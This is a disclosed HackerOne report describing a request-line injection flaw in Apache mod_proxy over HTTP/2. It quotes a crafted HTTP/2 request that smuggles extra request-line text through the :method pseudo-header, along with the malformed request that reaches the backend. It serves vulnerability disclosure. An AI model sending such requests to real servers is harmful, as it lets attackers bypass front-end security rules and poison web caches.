# Request line injection via HTTP/2 in Apache mod_proxy

## Report Details
- **Report ID**: 1391549
- **URL**: https://hackerone.com/reports/1391549
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-11-04T13:39:46.390Z
- **Disclosed**: 2021-11-04T16:11:57.185Z

## Reporter
- **Username**: albinowax
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
I've written this issue up fully here: https://portswigger.net/research/http2#request

In case it's useful, here's the original report as sent to Apache:

> I'd like to report a vulnerability in Apache mod_proxy when used with HTTP/2 enabled. 
> 
> It fails to reject HTTP requests that contain spaces in the :method HTTP/2 pseudo-header. This leads to a request-line injection vulnerability when it downgrades the requests to HTTP/1.1 and routes them on to the backend.
> 
> Attacker HTTP/2 request:
> ```
> :method: GET /anything HTTP/1.1
> :path: /
> :authority: psres.net
> Accept-Encoding: gzip, deflate
> ```
> Resulting request forwarded to the backend by mod_proxy:
> ```
> GET /anything HTTP/1.1 / HTTP/1.1
> Host:: psres.net
> Accept-Encoding: gzip, deflate  
> ```
> Provided the back-end server tolerates trailing junk in request lines, this enables attackers to bypass front-end security rules, poison web caches, and > change the protocol to HTTP/0.9 or 1.0, potentially enabling further attacks. I have identified some vulnerable systems in the wild.

Please let me know if you'd like any additional information

## Impact

This lets attackers bypass front-end security rules like block-rules and escape subfolders. In some cases it may enable further attacks via protocol-downgrades and cache poisoning.

## Attachments
No attachments
